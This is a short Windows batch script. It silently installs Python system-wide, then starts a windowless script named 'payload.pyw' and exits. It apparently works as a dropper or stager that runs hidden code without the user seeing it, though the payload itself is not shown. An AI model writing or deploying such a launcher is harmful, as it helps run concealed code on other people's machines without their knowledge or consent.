@echo off 
python-3.9.16.exe /quiet InstallAllUsers=1 PrependPath=1 Include_test=0
start payload.pyw
exit